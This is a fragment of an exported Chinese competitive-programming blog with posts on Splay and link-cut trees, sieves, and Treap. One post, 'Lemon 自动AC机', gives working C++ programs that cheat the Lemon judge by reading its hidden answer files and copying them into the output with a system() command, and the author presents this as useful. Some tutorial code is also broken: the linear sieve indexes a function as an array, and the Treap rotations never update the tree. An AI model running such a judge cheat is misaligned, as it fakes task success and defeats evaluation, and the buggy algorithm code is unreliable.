&#123; Node *node = new Node; node-&gt;key = key; return valueInsert(root, node); &#125;&#125;;struct Splay &#123; struct Node &#123; Node *fa, *ch[2], **root; int x, size, cnt; Node(Node **root, Node *fa, int x) : root(root), fa(fa), x(x), cnt(1), size(1) &#123; ch[0] = ch[1] = NULL; &#125; int relation() &#123; return this == fa-&gt;ch[0] ? 0 : 1; &#125; void maintain() &#123; size = cnt; if (ch[0]) size += ch[0]-&gt;size; if (ch[1]) size += ch[1]-&gt;size; &#125; void rotate() &#123; Node *old = fa; int r = relation(); fa = old-&gt;fa; if (old-&gt;fa) old-&gt;fa-&gt;ch[old-&gt;relation()] = this; if (ch[r ^ 1]) ch[r ^ 1]-&gt;fa = old; old-&gt;ch[r] = ch[r ^ 1]; old-&gt;fa = this; ch[r ^ 1] = old; old-&gt;maintain(); maintain(); if (fa == NULL) *root = this; &#125; void splay(Node *target = NULL) &#123; while (fa != target) &#123; if (fa-&gt;fa == target) &#123; rotate(); &#125; else if (fa-&gt;relation() == relation()) &#123; fa-&gt;rotate(); rotate(); &#125; else &#123; rotate(); rotate(); &#125; &#125; &#125; Node *pred() &#123; Node *v = ch[0]; while (v-&gt;ch[1]) v = v-&gt;ch[1]; return v; &#125; Node *succ() &#123; Node *v = ch[1]; while (v-&gt;ch[0]) v = v-&gt;ch[0]; return v; &#125; int rank() &#123; return ch[0] ? ch[0]-&gt;size : 0; &#125; &#125; *root; Splay() : root(NULL) &#123; insert(INT_MAX); insert(INT_MIN); &#125; Node *insert(int x) &#123; Node **v = &amp;root, *fa = NULL; while (*v != NULL &amp;&amp; (*v)-&gt;x != x) &#123; fa = *v; fa-&gt;size++; if (x &lt; fa-&gt;x) &#123; v = &amp;fa-&gt;ch[0]; &#125; else &#123; v = &amp;fa-&gt;ch[1]; &#125; &#125; if (*v != NULL) &#123; (*v)-&gt;cnt++; (*v)-&gt;size++; &#125; else &#123; (*v) = new Node(&amp;root, fa, x); &#125; (*v)-&gt;splay(); return root; &#125; Node *find(int x) &#123; Node *v = root; while (v != NULL &amp;&amp; v-&gt;x != x) &#123; if (x &lt; v-&gt;x) &#123; v = v-&gt;ch[0]; &#125; else &#123; v = v-&gt;ch[1]; &#125; &#125; if (v) v-&gt;splay(); return v; &#125; void erase(Node *v) &#123; Node *pred = v-&gt;pred(), *succ = v-&gt;succ(); pred-&gt;splay(); succ-&gt;splay(pred); if (v-&gt;size &gt; 1) &#123; v-&gt;size--; v-&gt;cnt--; &#125; else &#123; delete succ-&gt;ch[0]; succ-&gt;ch[0] = NULL; &#125; succ-&gt;size--; pred-&gt;size--; &#125; void erase(int x) &#123; Node *v = find(x); if (!v) return; erase(v); &#125; int pred(int x) &#123; Node *v = find(x); if (v == NULL) &#123; v = insert(x); int res = v-&gt;pred()-&gt;x; erase(v); return res; &#125; else &#123; return v-&gt;pred()-&gt;x; &#125; &#125; int succ(int x) &#123; Node *v = find(x); if (v == NULL) &#123; v = insert(x); int res = v-&gt;succ()-&gt;x; erase(v); return res; &#125; else &#123; return v-&gt;succ()-&gt;x; &#125; &#125; int rank(int x) &#123; Node *v = find(x); if (v == NULL) &#123; v = insert(x); int res = v-&gt;rank(); erase(v); return res; &#125; else &#123; return v-&gt;rank(); &#125; &#125; int select(int k) &#123; Node *v = root; while (!(k &gt;= v-&gt;rank() &amp;&amp; k &lt; v-&gt;rank() + v-&gt;cnt)) &#123; if (k &lt; v-&gt;rank()) &#123; v = v-&gt;ch[0]; &#125; else &#123; k -= v-&gt;rank() + v-&gt;cnt; v = v-&gt;ch[1]; &#125; &#125; v-&gt;splay(); return v-&gt;x; &#125;&#125; splay;template &lt;typename T&gt;struct LinkCutTree &#123; enum Relation &#123; L = 0, R = 1 &#125;; struct Node &#123; Node *child[2], *parent, *pathParent; T value, sum, max; bool reversed; Node(const T &amp;value) : reversed(false), value(value), sum(value), max(value), parent(NULL), pathParent(NULL) &#123; child[L] = child[R] = NULL; &#125; Relation relation() &#123; return this == parent-&gt;child[L] ? L : R; &#125; void pushDown() &#123; if (reversed) &#123; std::swap(child[L], child[R]); if (child[L]) child[L]-&gt;reversed ^= 1; if (child[R]) child[R]-&gt;reversed ^= 1; reversed = false; &#125; &#125; void maintain() &#123; sum = value; if (child[L]) sum += child[L]-&gt;sum; if (child[R]) sum += child[R]-&gt;sum; max = value; if (child[L]) max = std::max(max, child[L]-&gt;max); if (child[R]) max = std::max(max, child[R]-&gt;max); &#125; void rotate() &#123; if (parent-&gt;parent) parent-&gt;parent-&gt;pushDown(); parent-&gt;pushDown(), pushDown(); std::swap(pathParent, parent-&gt;pathParent); Relation x = relation(); Node *oldParent = parent; if (oldParent-&gt;parent) oldParent-&gt;parent-&gt;child[oldParent-&gt;relation()] = this; parent = oldParent-&gt;parent; oldParent-&gt;child[x] = child[x ^ 1]; if (child[x ^ 1]) child[x ^ 1]-&gt;parent = oldParent; child[x ^ 1] = oldParent; oldParent-&gt;parent = this; oldParent-&gt;maintain(), maintain(); &#125; void splay() &#123; while (parent) &#123; if (!parent-&gt;parent) rotate(); else &#123; parent-&gt;parent-&gt;pushDown(), parent-&gt;pushDown(); if (relation() == parent-&gt;relation()) parent-&gt;rotate(), rotate(); else rotate(), rotate(); &#125; &#125; &#125; void evert() &#123; access(); splay(); reversed ^= 1; &#125; void expose() &#123; splay(); pushDown(); if (child[R]) &#123; child[R]-&gt;parent = NULL; child[R]-&gt;pathParent = this; child[R] = NULL; maintain(); &#125; &#125; bool splice() &#123; splay(); if (!pathParent) return false; pathParent-&gt;expose(); pathParent-&gt;child[R] = this; parent = pathParent; pathParent = NULL; parent-&gt;maintain(); return true; &#125; void access() &#123; expose(); while (splice()); &#125; const T &amp;querySum() &#123; access(); splay(); return sum; &#125; const T &amp;queryMax() &#123; access(); splay(); return max; &#125; &#125;; Node *nodes[MAXN]; void makeTree(int u, const T &amp;value) &#123; nodes[u - 1] = new Node(value); &#125; void link(int u, int v) &#123; nodes[v - 1]-&gt;evert(); nodes[v - 1]-&gt;pathParent = nodes[u - 1]; &#125; void cut(int u, int v) &#123; nodes[u - 1]-&gt;evert(); nodes[v - 1]-&gt;access(); nodes[v - 1]-&gt;splay(); nodes[v - 1]-&gt;pushDown(); nodes[v - 1]-&gt;child[L]-&gt;parent = NULL; nodes[v - 1]-&gt;child[L] = NULL; nodes[v - 1]-&gt;maintain(); &#125; const T &amp;querySum(int u, int v) &#123; nodes[u - 1]-&gt;evert(); return nodes[v - 1]-&gt;querySum(); &#125; const T &amp;queryMax(int u, int v) &#123; nodes[u - 1]-&gt;evert(); return nodes[v - 1]-&gt;queryMax(); &#125; void update(int u, const T &amp;value) &#123; nodes[u - 1]-&gt;splay(); nodes[u - 1]-&gt;value = value; nodes[u - 1]-&gt;maintain(); &#125;&#125;;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>模板</tag>
        <tag>平衡树</tag>
        <tag>线段树</tag>
        <tag>Treap</tag>
        <tag>Splay</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
        <tag>主席树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[Shq]等差数列?]]></title>
    <url>%2Farticles%2Fquestion-01%2F</url>
    <content type="text"><![CDATA[Shq五难题之一题目背景一日，大蒟蒻Shq在看dalao ycy的Blog的时候，发现ycy的Blog有个十分玄学的Bug特性，ycy特地江一篇文章中的数字变成这样题目描述Shq突发奇想，给出你一个首项为A, 公差为P的等差数列，江他们按照这样排成一行，求第n个数字是多少输入&amp;&amp;输出格式输入格式输入共有两行 第一行有两个数，为A和P。 第二行有一个数，为n输出格式输出所对应的数输入&amp;&amp;输出样例输入样例11 1 1输出样例11数据范围0 &lt;= A &lt;= 10^5 -10^3 &lt;= P &lt;= 10^3 1 &lt;= n &lt;= 10^7]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>problem</tag>
        <tag>题目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sandaram筛法]]></title>
    <url>%2Farticles%2FSandaram%2F</url>
    <content type="text"><![CDATA[辛达拉姆筛法（Sandaram）是一种十分玄学的筛法常规判定方法123456int classic(long long a) &#123; long long half = (long long)sqrt(a); for(int i=2;i&lt;=half;i++) if(a%i==0) return 0; return 1;&#125;常规的素数判定思想和实现都很easy，可是效率较低。如今存在不少更高效的素数判定方法，比方费马測试、算法、数域筛法等。可是这些算法要么不精确要么须要的数学知识过于复杂，在此不做过多介绍。以下我们介绍一种仅仅须要初等数学就可以明确的素数判定方法，该方法在不论什么情况下都会获得比常规方法好一倍的性能。埃氏筛法​ 在介绍新方法之前。我们先回想一下埃氏筛法，这是一个与辗转相除法一样古老的算法。​ 大约在公元前3世纪，古希腊数学家埃拉托色尼提出了一种编造素数表的方法（如表一）。这样的方法类似于筛东西，把不要的筛掉。把须要的留下。详细做法是：将从2到N的自然数，按顺序排列成2,3,4,5,…,N，然后留下第一个2。划去全部2的倍数；2之后没划去的第一个数是3。留下3，划去全部3的倍数；在3后面没划掉的第一个数是5，留下5，划去全部5的倍数。如此继续。直至上述一列数中再也没有可划的数为止，留下来的便是N以内的一切素数。表一 埃氏筛法​ 假设仅仅对一个整数进行素性判定，常规判定方法或者后面介绍的方法就足够了。但假设要对很多整数进行素性判定，就须要採用埃氏筛法。下面枚举算法摘自《挑战程序设计竞赛》一书：12345678910111213141516int prime[MAX_N];bool is_prime[MAX_N];//返回n以内的素数个数int sieve(int n) &#123; int p = 0; for(int i = 0; i &lt;= n; i++) is_prime[i] = true; is_prime[0] = is_prime[1] = false; for(int i = 2; i &lt;= n; i++) &#123; if(is_prime[i]) &#123; prime[p++] = i; for(int j = 2 * i; j &lt;= n; j += i) is_prime[j] = false; &#125; &#125; return p;&#125;辛达拉姆筛法​ 公元1934年。一名年轻的东印度数学生辛达拉姆。提出了一种与埃拉托色尼迥然不同的筛法。它首先列出了一张表，如表二。表的第一行和第一列都是首项为4。公差为3的等差数列。从第二行开始。以后各行也是等差数列，公差分别为5,7,9,11,13……。能够看出，该表事实上是一个对称矩阵。辛达拉姆指出：假设N出如今表中，则2N+1是合数。若N不在表中，则2N+1是素数。证明相当精彩！先证明前半部分。首先。他写出来第m行的第一个数：4+(m-1)×3=3m+1注意到该行是公差为2m+1的等差数列，所以此行第n列的数是：3m+1+(n-1)*(2m+1)=2mn+m+n即第m行n列的数是2mn+m+n。于是2N+1=4mn+2m+2n+1=(2m+1)(2n+1)是合数。再证后半部分。要想正面证明2N+1是素数是相当困难的。假设换成等价的逆否命题，即证“若2N+1不是素数，则N必在表中”似乎要easy得多。其实。若2N+1=xy(x ,y)*为整数则因2N+1为奇数，x、y也必为奇数。最好还是设： x=2p+1;y=2q+1从而2N+1=(2p+1)(2q+1)=4pq+2p+2q+1。由此能够得到 N=2pq+p+q。也即N是表中第p行第q列的数。综上所述。我们证明了辛达拉姆筛法的正确性。比如18不在表中，则2*18+1=37为素数。相反，71在表中，则2*71+1=143是合数。后半部分的证明是反证法的绝佳实例。基于辛达拉姆筛的素数推断​ 有了辛达拉姆筛法，我们该怎样判定一个正整数n是否为素数呢？我们仅仅须要推断(n-1)/2是否在表中就可以。因为须要判定的数肯定是奇数（偶数肯定都是合数）。所以(n-1)/2肯定能够整除。推断是否在表中，也即推断是否存在p和q使得2pq+p+q=(n-1)/2。依照这个思路实现的代码例如以下：1234567891011int xindalamu(long long a) &#123; if(a % 2 == 0) return 0; long long aa = (a - 1) &gt;&gt; 1; long long half = (long long)sqrt(aa / 2); for(int i = 1; i &lt;= half; i++) if((aa - i) % (2 * i + 1) == 0) return 0; return 1;&#125;以下详解一下上面的代码。首先推断用户输入是否是偶数。假设是直接返回false。然后将用户输入减一除以二赋值给aa，后面就须要推断aa是否在表中。推断的方法和常规推断的方法类似。也是须要验证某一行是否出现整除的情况，只是这里公式稍有不同。从上述代码能够看到。在对aa开方的时候，我们将其除以二。这是为什么呢？推断aa是否出如今表中，也即推断是否存在p和q使得2pq+p+q=aa。这和常规方法中的推断aa=p*q稍有不同。忽略掉两个小项，我们须要推断2pq是否等于aa。也即pq是否等于aa/2，这就是除以2的原因。for循环从第一行開始检查。推断该行是否存在列满足2pq+p+q=aa。当行号固定之后。推断的方法是看aa-p是否整除2p+1（稍作变化就可以看出）。我们分析一下基于辛达拉姆筛的素数判定复杂度。由for循环能够看出。复杂度也是O(根号n)。只是常系数比常规方法要小。这是由于，在求aa时有个除以二的操作，在开方时又有一个除以二的操作。所以相当于对a/4进行开方，因而最多仅仅须要对根号a/2的行进行推断。而常规方法最多则须要验证根号n不同的因子。所以能够看出基于辛达拉姆筛的素数判定方法比常规方法快一倍。​ 可是，另一个疑问须要解决，假设用户输入的是一个合数，基于辛达拉姆筛的素数判定方法是否还优于常规判定方法。能够证明，无论输入的是合数还是素数，基于辛达拉姆筛的素数判定方法始终比常规方法快一倍。证明例如以下：​ 假设用户输入的是素数，在分析复杂度的时候已经证明。假设用户输入的是合数，则常规方法在遇到a的最小质因子b时返回，而辛达拉姆判定方法会在遍历到第(b-1)/2行时返回。假设a=b*y，由于a是合数，则肯定存在p行和q列使得2pq+p+q=(a-1)/2。变换得(2p+1)(2q+1)=a。由于辛达拉姆判定方法在遍历时是从第一行開始的，所以我们能够觉得b=2p+1，从而辛达拉姆判定方法在第(b-1)/2行时返回。这也就证明了当输入是合数（奇数）时，基于辛达拉姆筛的素数判定方法也比常规方法快一倍。]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>算法</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>素数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线性筛]]></title>
    <url>%2Farticles%2FLinear-sieve%2F</url>
    <content type="text"><![CDATA[求素数是程序设计比赛(NOIP, NOI, CTSC······)中经常遇到的问题求素数是程序设计比赛中经常遇到的问题，最基本的方法是通过素数的定义直接判断，只能被1和它本身整除的数就是素数了。这种方法适合判断单个数是否为素数，当要求一个范围内素数而这个范围又比较大时，这种方法就不太使用了，甚至程序要运行几分钟才能算出结果。筛法的思想是去除要求范围内所有的合数，剩下的就是素数了，而任何合数都可以表示为素数的乘积，因此如果已知一个数为素数，则它的倍数都为合数。Code:12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;#define MAX 100000//求MAX范围内的素数long long su[MAX], cnt;bool isprime[MAX];void prime() &#123; cnt=1; memset(isprime, 1, sizeof(isprime));//初始化认为所有数都为素数 isprime[0] = isprime[1] = 0;//0和1不是素数 for(long long i = 2; i &lt;= MAX; i++) &#123; if(isprime[i])//保存素数 su[cnt++] = i; for(long long j = i * 2; j &lt;= MAX; j += i) &#123;//素数的倍数都为合数 isprime[j] = 0; if(i % prime[j] == 0) break; &#125; &#125;&#125;int main() &#123; prime(); for(long long i = 1; i &lt; cnt; i++) printf("%d ", su[i]); return 0;&#125;这样线性筛法虽然大大缩短了求素数的时间，但是实际上还是做了许多重复运算，比如2*3=6，在素数2的时候筛选了一遍，在素数为3时又筛选了一遍。如果只筛选小于等于素数i的素数与i的乘积，既不会造成重复筛选，又不会遗漏。时间复杂度几乎是线性的。优化后的线性筛法：123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;#define MAX 100000//求MAX范围内的素数long long su[MAX], cnt;bool isprime[MAX];void prime() &#123; cnt = 1; memset(isprime, 1, sizeof(isprime));//初始化认为所有数都为素数 isprime[0] = isprime[1] = 0;//0和1不是素数 for(long long i = 2; i &lt;= MAX; i++) &#123; if(isprime[i]) su[cnt++] = i;//保存素数i for(long long j = 1;j &lt; cnt &amp;&amp; su[j] * i &lt; MAX; j++) &#123; isprime[su[j] * i] = 0;//筛掉小于等于i的素数和i的积构成的合数 if(i % prime[j] == 0) break; &#125; &#125;&#125;int main()&#123; prime(); for(long long i = 1; i &lt; cnt; i++) printf("%d ", su[i]); return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>算法</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线性筛</tag>
        <tag>素数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「算法」Treap算法]]></title>
    <url>%2Farticles%2Ftreap%2F</url>
    <content type="text"><![CDATA[Treap 算法是个简单易懂的算法在说Treap前，我们来先说下二叉堆二叉堆是一种特殊的堆，二叉堆是完全二元树（二叉树）或者是近似完全二元树（二叉树）。二叉堆有两种：最大堆和最小堆。最大堆：父结点的键值总是大于或等于任何一个子节点的键值； 最小堆：父结点的键值总是小于或等于任何一个子节点的键值。图示:如上图，这就是一个小根堆，所有非根节点的节点均小于这个节点的父亲。简单介绍了堆，我们就开始看TreapTreap = Tree + HeapTreap是一棵拥有键值和优先级的树.对于键值而言, Treap是一棵排序二叉树 对于优先级而言, Treap是堆.旋转Treap因为Treap既要满足键值排序二叉树结构,又要满足优先级的堆结构. 旋转的Treap是通过旋转来维护性质的,如图所示,以右旋为例若x优先级比u高,当前子树不满足堆性质,要将x旋上去. 将x旋到u处成为当前子树根,将u旋下去成为x的右儿子,那么x原来的左儿子b就空出来了,将键值b作为u的左儿子,旋转完毕.代码:123456789101112131415// 左旋操作void Left_rotate(Node* root)&#123; Node* temp = root-&gt;right; root-&gt;right = temp-&gt;left; temp-&gt;left = root; root = temp;&#125;// 右旋操作void Right_rotate(Node* root)&#123; Node* temp = root-&gt;left; root-&gt;left = temp-&gt;right; temp-&gt;right = root; root = temp;&#125;Treap中插入节点 「节点的插入」是一个递归的过程，我们从根节点开始，逐个判断当前节点的值与插入值的大小关系。如果插入值小于当前节点值，则递归至左儿子；大于则递归至右儿子； 相等则直接在把当前节点数值的出现次数 +1 ，跳出循环即可。如果当前访问到了一个空节点，则初始化新节点，将其加入到 Treap 的当前位置。123456789101112131415161718192021222324252627282930// 插入元素int valueInsert(Node* root, Node* node)&#123; bool Flag = false; if (root == NULL) &#123; root = node; return true; &#125; if (root-&gt;key &gt; node-&gt;key)&#123; Flag = valueInsert(root-&gt;left, node); if (root-&gt;priority &gt; node-&gt;priority) Left_rotate(root); return Flag; &#125; if (root-&gt;key &lt; node-&gt;key)&#123; Flag = valueInsert(root-&gt;right, node); if (root-&gt;priority &lt; node-&gt;priority) Right_rotate(root); return Flag; &#125; delete node; return Flag;&#125;// 真·插入bool Insert(Node* root, int key, int priority)&#123; Node* node = new Node; node-&gt;key = key; node-&gt;priority = priority; return valueInsert(root, node);&#125;Treap中删除节点 「节点的删除」同样是一个递归的过程，不过需要讨论多种情况：如果插入值小于当前节点值，则递归至左儿子；大于则递归至右儿子。如果插入值等于当前节点值：若当前节点数值的出现次数大于 1 ，则减一;若当前节点数值的出现次数等于于 1 :若当前节点没有左儿子与右儿子，则直接删除该节点（置 0）；若当前节点没有左儿子或右儿子，则将左儿子或右儿子替代该节点；若当前节点有左儿子与右儿子，则不断旋转 当前节点，并走到当前节点新的对应位置，直到没有左儿子或右儿子为止。时间复杂度均为 O(logn) 。代码:12345678910111213141516171819202122// 删除元素bool remove(Node* root, int key)&#123; if (root == NULL) return false; if (root-&gt;key &gt; key) return remove(root-&gt;left, key); if (root-&gt;key&lt; key) return remove(root-&gt;right, key); Node* node = root; while (node-&gt;left &amp;&amp; node-&gt;right)&#123; if (node-&gt;left-&gt;priority &lt;= node-&gt;right-&gt;priority)&#123; Right_rotate(node); node = node-&gt;right; &#125; if (node-&gt;left-&gt;priority &gt; node-&gt;right-&gt;priority)&#123; Left_rotate(node); node = node-&gt;left; &#125; &#125; if (node-&gt;left == NULL) node = node-&gt;right; else if(node-&gt;right == NULL) node = node-&gt;left; return true;&#125;求Treap的先续遍历这是树的基本操作代码12345678// 求先续遍历void in_order_traverse(Node* root)&#123; if (root != NULL)&#123; // 判断是否有root in_order_traverse(root-&gt;left); printf("%d ", root-&gt;key); in_order_traverse(root-&gt;right); &#125;&#125;求Treap的后续遍历代码:12345678// 求后续遍历void Pre_order_traverse(Node* root)&#123; if (root != NULL)&#123; printf("%d ", root-&gt;key); Pre_order_traverse(root-&gt;left); Pre_order_traverse(root-&gt;right); &#125;&#125;求Treap的高度Treap的高度，我们可以用递归来实现1234567// 求树的高度int depth(Node* root)&#123; if(root == NULL) return -1; int leftDepth = depth(root-&gt;left); int RightDepth = depth(root-&gt;right); return leftDepth &gt; RightDepth ? leftDepth + 1 : RightDepth + 1;&#125;总结Treap是一个十分简单易懂的算法总代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;stack&gt;#include &lt;queue&gt;const int SMAX = 32768;std::vector&lt;int&gt; ans;int tot;//节点struct Node &#123; int key; int priority; Node* left; Node* right;&#125;;Node* root;// 左旋操作void Left_rotate(Node* root)&#123; Node* temp = root-&gt;right; root-&gt;right = temp-&gt;left; temp-&gt;left = root; root = temp;&#125;// 右旋操作void Right_rotate(Node* root)&#123; Node* temp = root-&gt;left; root-&gt;left = temp-&gt;right; temp-&gt;right = root; root = temp;&#125;// 插入元素int valueInsert(Node* root, Node* node)&#123; bool Flag = false; if (root == NULL) &#123; root = node; return true; &#125; if (root-&gt;key &gt; node-&gt;key)&#123; Flag = valueInsert(root-&gt;left, node); if (root-&gt;priority &gt; node-&gt;priority) Left_rotate(root); return Flag; &#125; if (root-&gt;key &lt; node-&gt;key)&#123; Flag = valueInsert(root-&gt;right, node); if (root-&gt;priority &lt; node-&gt;priority) Right_rotate(root); return Flag; &#125; delete node; return Flag;&#125;// 真·插入bool Insert(Node* root, int key, int priority)&#123; Node* node = new Node; node-&gt;key = key; node-&gt;priority = priority; return valueInsert(root, node);&#125;// 删除元素bool remove(Node* root, int key)&#123; if (root == NULL) return false; if (root-&gt;key &gt; key) return remove(root-&gt;left, key); if (root-&gt;key&lt; key) return remove(root-&gt;right, key); Node* node = root; while (node-&gt;left &amp;&amp; node-&gt;right)&#123; if (node-&gt;left-&gt;priority &lt;= node-&gt;right-&gt;priority)&#123; Right_rotate(node); node = node-&gt;right; &#125; if (node-&gt;left-&gt;priority &gt; node-&gt;right-&gt;priority)&#123; Left_rotate(node); node = node-&gt;left; &#125; &#125; if (node-&gt;left == NULL) node = node-&gt;right; else if(node-&gt;right == NULL) node = node-&gt;left; return true;&#125;// 求先续遍历void in_order_traverse(Node* root)&#123; if (root != NULL)&#123; in_order_traverse(root-&gt;left); printf("%d ", root-&gt;key); in_order_traverse(root-&gt;right); &#125;&#125;// 求后续遍历void Pre_order_traverse(Node* root)&#123; if (root != NULL)&#123; printf("%d ", root-&gt;key); Pre_order_traverse(root-&gt;left); Pre_order_traverse(root-&gt;right); &#125;&#125;// 求树的高度int depth(Node* root)&#123; if(root == NULL) return -1; int leftDepth = depth(root-&gt;left); int RightDepth = depth(root-&gt;right); return leftDepth &gt; RightDepth ? leftDepth + 1 : RightDepth + 1;&#125;//搜索Node* Search(Node* root, int key)&#123; if (root == NULL) return NULL; if (root-&gt;key &gt; key) return Search(root-&gt;left, key); if (root-&gt;key &lt; key) return Search(root-&gt;right, key); return root;&#125;// 求前驱 / 后继void queryInOrder(Node* root)&#123; if (root != NULL)&#123; queryInOrder(root-&gt;left); ans.push_back(root-&gt;key); queryInOrder(root-&gt;right); &#125;&#125;// 求前驱 / 后继int Next(Node* root, int num, int value)&#123; ans.clear(); tot = 0; queryInOrder(root); return ans[num + value];&#125;// 快读int SlowRead()&#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int main(int argc, char const *argv[]) &#123; srand(time(NULL)); int num = SlowRead(), kind; long long number; while (--num)&#123; kind = SlowRead(); number = SlowRead(); // 插入元素 if (kind == 1) Insert(root, number, rand()%SMAX); // 删除元素 if (kind == 2) remove(root, number); // 输出中序遍历 if (kind == 3) in_order_traverse(root); // 输出前序排列 if (kind == 4) Pre_order_traverse(root); // 删除指定值的元素 if (kind == 5) remove(Search(root, number), number); // 求前驱 if (kind == 6) printf("%d", Next(root, number, 1)); // 求后继 if (kind == 7) printf("%d", Next(root, number, -1)); //求树的高度 if (kind == 8) printf("%d", depth(root)); printf("\n"); &#125; return 0;&#125;(End)]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>算法</tag>
        <tag>平衡树</tag>
        <tag>Treap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「Lemon」自动AC机]]></title>
    <url>%2Farticles%2FautoAC-lemon%2F</url>
    <content type="text"><![CDATA[这是自动AC机不是AC自动机qwq ---------Shq自动AC机实现原理:获取输入文件检测是否为对应文件在Lemon评测文件中取得答案输出明显，这样做是可以的代码:12345678910111213141516171819202122232425262728293031323334// Lemon 自动AC机#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;char in[1000];int main()&#123; int num1,num2,id,n1,n2; freopen("****.in","r",stdin); //****为题目名称 freopen("****.out","w",stdout); scanf("%d",&amp;n1); scanf("%d",&amp;n2); fclose(stdin); for (int i=1;i&lt;=10;i++)&#123; sprintf(in,"..\\..\\data\\****\\****%d.in",i); freopen(in,"r",stdin); scanf("%d%d",&amp;num1,&amp;num2); if (num1==n1&amp;&amp;num2==n2) &#123;id=i;break;&#125; fclose(stdin); &#125; sprintf(in,"..\\..\\data\\****\\****%d.ans",id); freopen(in,"r",stdin); string ans; cin&gt;&gt;ans; cout&lt;&lt;ans&lt;&lt;endl; return 0;&#125;优化毒瘤版本:-&gt;注意，这是直接再文件中复制到输出各个平台拷贝命令:Windows: copyLinux: cpMac: 什么?你给我说Mac?我就问，你见过评测机有多少是Mac的?12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#ifndef __linux__ // 自动识别Linux / Windows#include&lt;windows.h&gt;#endif//#include&lt;cstdlib&gt;//#include&lt;sys/types.h&gt;//#include&lt;unistd.h&gt;#include&lt;dirent.h&gt;#include&lt;string&gt;#include&lt;vector&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;string f=__FILE__;int n,l;typedef std::pair&lt;int,string&gt; p;vector&lt;p&gt;v;char s[1000];inline char*rread(int&amp;r,char*s)&#123; r=0; while(*s&lt;'0'||*s&gt;'9')s--; for(int b=1;*s&gt;='0'&amp;&amp;*s&lt;='9';b*=10,s--) r+=b*(*s-'0'); return s;&#125;#include&lt;iostream&gt;int main()&#123; f=f.substr(0,f.find_last_of('.',f.length()));#ifdef __linux__ DIR*dir=opendir(("../../data/"+f).c_str()); dirent*ptr; while((ptr=readdir(dir))!=NULL) if((l=strlen(ptr-&gt;d_name))&gt;3&amp;&amp; (string(ptr-&gt;d_name).rfind(".out",l)==l-4|| string(ptr-&gt;d_name).rfind(".ans",l)==l-4)) &#123; rread(n,ptr-&gt;d_name+strlen(ptr-&gt;d_name)); v.push_back(p(n,string(ptr-&gt;d_name))); &#125; realpath(".",s);#else f=f.substr(f.find_last_of('\\',f.length())+1,f.length()); WIN32_FIND_DATA d; HANDLE hFind=FindFirstFile(("..\\..\\data\\"+f+"\\*").c_str(), &amp;d); do if((l=strlen(d.cFileName))&gt;3&amp;&amp; (string(d.cFileName).rfind(".out",l)==l-4|| string(d.cFileName).rfind(".ans",l)==l-4))&#123; rread(n,d.cFileName+strlen(d.cFileName)); v.push_back(p(n,string(d.cFileName))); &#125;while (FindNextFile(hFind, &amp;d) != 0); FindClose(hFind); GetModuleFileName(NULL,s,1000);#endif rread(n,rread(l,s+strlen(s))); sort(v.begin(),v.end());#ifdef __linux__ // Linux / Windows的复制命令不一样 system(("cp -f ../../data/"+f+'/'+v[n].second+" "+f+".out").c_str());#else system(("copy ..\\..\\data\\"+f+'\\'+v[n].second+" "+f+".out").c_str());#endif return 0;&#125;这是一篇有用的文章，不是吗?]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Lemon</tag>
        <tag>评测机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chtholly完形填空]]></title>
    <url>%2Farticles%2FP3933Chtholly%2F</url>
